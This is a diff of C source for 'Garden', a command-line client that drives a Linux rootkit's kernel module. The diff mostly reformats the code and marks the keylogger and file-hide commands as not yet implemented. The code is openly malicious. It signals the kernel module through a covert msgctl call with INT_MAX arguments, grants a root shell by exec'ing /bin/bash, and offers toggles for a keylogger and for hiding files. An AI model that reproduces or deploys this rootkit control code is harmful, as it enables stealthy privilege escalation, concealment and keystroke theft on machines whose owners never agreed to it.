@@ -8,10 +8,10 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
 #include <sys/ipc.h>
 #include <sys/msg.h>
 #include <sys/types.h>
+#include <unistd.h>
 
 /**
  * ##############
@@ -47,84 +47,83 @@
  */
 // TODO: Extract this to an h file to avoid duplication.
 typedef struct function_code {
-	int get_root;
-	int keylogger_enable;
-	int keylogger_disable;
-	int file_hide_add;
-	int file_hide_rm;
-	int file_hide_show;
+    int get_root;
+    int keylogger_enable;
+    int keylogger_disable;
+    int file_hide_add;
+    int file_hide_rm;
+    int file_hide_show;
 } function_code;
 
 function_code functionCode = {
-	.get_root = 0,
-	.keylogger_enable = 1,
-	.keylogger_disable = 2,
-	.file_hide_add = 3,
-	.file_hide_rm = 4,
-	.file_hide_show = 5
-};
+    .get_root = 0,
+    .keylogger_enable = 1,
+    .keylogger_disable = 2,
+    .file_hide_add = 3,
+    .file_hide_rm = 4,
+    .file_hide_show = 5};
 
 // This action_task struct is what is actually passed to the LKM.
 typedef struct action_task {
-	int func_code;
-	char* file_hide_str;
+    int func_code;
+    char *file_hide_str;
 } action_task;
 
 /**
  * Printing
  */
 
-void print_red(const char* text) {
-	printf("%s %s %s", RED, text, RESET);
+void print_red(const char *text) {
+    printf("%s %s %s", RED, text, RESET);
 }
 
-void print_green(const char* text) {
-	printf("%s %s %s", GREEN, text, RESET);
+void print_green(const char *text) {
+    printf("%s %s %s", GREEN, text, RESET);
 }
 
-void print_blue(const char* text) {
-	printf("%s %s %s", BLUE, text, RESET);
-	//	printf("%s %s %s", CYAN, text, RESET);
+void print_blue(const char *text) {
+    printf("%s %s %s", BLUE, text, RESET);
+    //	printf("%s %s %s", CYAN, text, RESET);
 }
 
 void print_banner() {
-	char* banner =
-	    "\n\t ██████╗  █████╗ ██████╗ ██████╗ ███████╗███╗   ██╗\n \
+    char *banner =
+        "\n\t ██████╗  █████╗ ██████╗ ██████╗ ███████╗███╗   ██╗\n \
 \t██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝████╗  ██║\n \
 \t██║  ███╗███████║██████╔╝██║  ██║█████╗  ██╔██╗ ██║\n \
 \t██║   ██║██╔══██║██╔══██╗██║  ██║██╔══╝  ██║╚██╗██║\n \
 \t╚██████╔╝██║  ██║██║  ██║██████╔╝███████╗██║ ╚████║\n \
 \t ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝\n";
 
-	print_green(banner);
+    print_green(banner);
 }
 
 void print_usage() {
-	print_green("\nWelcome to the Garden.\n--------------\n");
-	print_green("\t/garden root\t\t\t\t - gives you root.\n");
-	print_green("\t/garden keylogger [enable/disable]\t - toggles the keylogger.\n");
-	print_green("\t/garden hide add PREFIX\t\t\t - adds PREFIX to the hide list.\n");
-	print_green("\t/garden hide rm PREFIX\t\t\t - removes PREFIX from the hide list.\n");
-	print_green("\t/garden hide ls\t\t\t\t - shows prefixes in the hide list.\n");
-	exit(0);
+    print_green("\nWelcome to the Garden.\n--------------\n");
+    print_green("\t/garden root\t\t\t\t - gives you root.\n");
+    print_green("\t/garden keylogger [enable/disable]\t - toggles the keylogger. (NOT IMPLEMENTED YET)\n");
+    print_green("\t/garden hide add PREFIX\t\t\t - adds PREFIX to the hide list. (NOT IMPLEMENTED YET)\n");
+    print_green("\t/garden hide rm PREFIX\t\t\t - removes PREFIX from the hide list. (NOT IMPLEMENTED YET)\n");
+    print_green("\t/garden hide ls\t\t\t\t - shows prefixes in the hide list. (NOT IMPLEMENTED YET)\n");
+    exit(0);
 }
 
 /**
  * Checks for subarg. If it doesn't exist, prints usage and
  * exits (inside print_usage).
  */
-bool check_for_subarg(int idx, char* argv[]) {
-	if (!argv[idx]) {
-		print_usage();
-	}
+bool check_for_subarg(int idx, char *argv[]) {
+    if (!argv[idx]) {
+        print_usage();
+    }
 
-	return true;
+    return true;
 }
 
-void handle_get_root(char* base_cmd, action_task* action) {
-	if (!strcmp(base_cmd, ROOT)) {
-		action->func_code = functionCode.get_root;
-	}
+void handle_get_root(char *base_cmd, action_task *action) {
+    if (!strcmp(base_cmd, ROOT)) {
+        action->func_code = functionCode.get_root;
+    }
 }
 
 /**
@@ -136,14 +135,14 @@ void handle_get_root(char* base_cmd, action_task* action) {
  * 	$ keylogger enable
  * 	$ keylogger disable
  */
-void handle_keylogger_action(char* base_cmd, char* subarg, action_task* action) {
-	if (!strcmp(base_cmd, KEYLOGGER)) {
-		if (!strcmp(subarg, ENABLE)) {  // Keylogger enable
-			action->func_code = functionCode.keylogger_enable;
-		} else if (!strcmp(subarg, DISABLE)) {  // Keylogger disable
-			action->func_code = functionCode.keylogger_disable;
-		}
-	}
+void handle_keylogger_action(char *base_cmd, char *subarg, action_task *action) {
+    if (!strcmp(base_cmd, KEYLOGGER)) {
+        if (!strcmp(subarg, ENABLE)) { // Keylogger enable
+            action->func_code = functionCode.keylogger_enable;
+        } else if (!strcmp(subarg, DISABLE)) { // Keylogger disable
+            action->func_code = functionCode.keylogger_disable;
+        }
+    }
 }
 
 /**
@@ -152,22 +151,22 @@ void handle_keylogger_action(char* base_cmd, char* subarg, action_task* action) 
  * 	$ hide add FILE
  * 	$ hide rm FILE
  */
-void handle_file_hide_action(char* base_cmd, char* subarg, char* argv[], action_task* action) {
-	if (!strcmp(base_cmd, FILE_HIDE)) {
-		if (!strcmp(subarg, SHOW)) {
-			action->func_code = functionCode.file_hide_show;
-		} else if (check_for_subarg(3, argv)) {  // Make sure the 3rd arg in $ hide [add/rm] FILE exists
-			if (!strcmp(subarg, ADD)) {
-				action->func_code = functionCode.file_hide_add;
-			} else if (!strcmp(subarg, REMOVE)) {
-				action->func_code = functionCode.file_hide_rm;
-			} else {
-				print_usage();
-			}
+void handle_file_hide_action(char *base_cmd, char *subarg, char *argv[], action_task *action) {
+    if (!strcmp(base_cmd, FILE_HIDE)) {
+        if (!strcmp(subarg, SHOW)) {
+            action->func_code = functionCode.file_hide_show;
+        } else if (check_for_subarg(3, argv)) { // Make sure the 3rd arg in $ hide [add/rm] FILE exists
+            if (!strcmp(subarg, ADD)) {
+                action->func_code = functionCode.file_hide_add;
+            } else if (!strcmp(subarg, REMOVE)) {
+                action->func_code = functionCode.file_hide_rm;
+            } else {
+                print_usage();
+            }
 
-			action->file_hide_str = argv[3];
-		}
-	}
+            action->file_hide_str = argv[3];
+        }
+    }
 }
 
 /**
@@ -177,75 +176,75 @@ void handle_file_hide_action(char* base_cmd, char* subarg, char* argv[], action_
  *
  * Returns 0 if successfully communicated, -1 otherwise.
  */
-int communicate_with_lkm(action_task* rootkit_action) {
-	struct msqid_ds messenger;
-	memset(&messenger, 0, sizeof(struct msqid_ds));
+int communicate_with_lkm(action_task *rootkit_action) {
+    struct msqid_ds messenger;
+    memset(&messenger, 0, sizeof(struct msqid_ds));
 
-	if (msgctl(INT_MAX, INT_MAX, (struct msqid_ds*)rootkit_action) == 0) {
-		print_green("Communication OK.\n");
-		return 0;
-	} else {
-		print_red("Communication failed.\n");
-		return -1;
-	}
+    if (msgctl(INT_MAX, INT_MAX, (struct msqid_ds *)rootkit_action) == 0) {
+        print_green("Communication OK.\n");
+        return 0;
+    } else {
+        print_red("Communication failed.\n");
+        return -1;
+    }
 }
 
 /**
  * If the action_task struct is populated, executes task and returns true.
  * Otherwise, returns false.
  */
-bool execute_action_if_possible(action_task* action) {
-	if (action->func_code != -1) {
-		// printf("Function code: %d, str: %s\n", action->func_code, action->file_hide_str);
-		if (communicate_with_lkm(action) == 0) {
-			if (action->func_code == functionCode.get_root) {
-				const char* bash = "/bin/bash";
-				char* const argv[3] = {bash, NULL};
-				char* const envp[1] = {NULL};
-				execve(bash, argv, envp);
-			}
-		}
+bool execute_action_if_possible(action_task *action) {
+    if (action->func_code != -1) {
+        // printf("Function code: %d, str: %s\n", action->func_code, action->file_hide_str);
+        if (communicate_with_lkm(action) == 0) {
+            if (action->func_code == functionCode.get_root) {
+                const char *bash = "/bin/bash";
+                char *const argv[3] = {bash, NULL};
+                char *const envp[1] = {NULL};
+                execve(bash, argv, envp);
+            }
+        }
 
-		return true;
-	} else {
-		return false;
-	}
+        return true;
+    } else {
+        return false;
+    }
 }
 
 /**
  * CLI for interacting with the rootkit and interfacing with the kernel module.
  */
-int main(int argc, char* argv[]) {
-	print_banner();
+int main(int argc, char *argv[]) {
+    print_banner();
 
-	// No args entered. Display help menu.
-	if (argc == 1 || !strcmp(argv[1], "-h") || !strcmp(argv[1], "--help")) {
-		print_usage();
-		return 0;
-	}
+    // No args entered. Display help menu.
+    if (argc == 1 || !strcmp(argv[1], "-h") || !strcmp(argv[1], "--help")) {
+        print_usage();
+        return 0;
+    }
 
-	// Set up action_task. This is what will be passed to the LKM to make
-	// things happen. Set the func_code to -1 initially so we can detect failure
-	// to set any options later.
-	action_task action;
-	memset(&action, 0, sizeof(action));
-	action.func_code = -1;
+    // Set up action_task. This is what will be passed to the LKM to make
+    // things happen. Set the func_code to -1 initially so we can detect failure
+    // to set any options later.
+    action_task action;
+    memset(&action, 0, sizeof(action));
+    action.func_code = -1;
 
-	// Parse single arg commands
-	char* base_cmd = argv[1];
-	handle_get_root(base_cmd, &action);
-	execute_action_if_possible(&action);
+    // Parse single arg commands
+    char *base_cmd = argv[1];
+    handle_get_root(base_cmd, &action);
+    execute_action_if_possible(&action);
 
-	// Parse double arg commands
-	check_for_subarg(2, argv);
-	char* subarg = argv[2];
-	handle_keylogger_action(base_cmd, subarg, &action);
+    // Parse double arg commands
+    check_for_subarg(2, argv);
+    char *subarg = argv[2];
+    handle_keylogger_action(base_cmd, subarg, &action);
 
-	// Parse triple arg commands
-	handle_file_hide_action(base_cmd, subarg, argv, &action);
-	execute_action_if_possible(&action);
+    // Parse triple arg commands
+    handle_file_hide_action(base_cmd, subarg, argv, &action);
+    execute_action_if_possible(&action);
 
-	// If we get here, no valid command has been entered.
-	print_usage();
-	return 0;
+    // If we get here, no valid command has been entered.
+    print_usage();
+    return 0;
 }
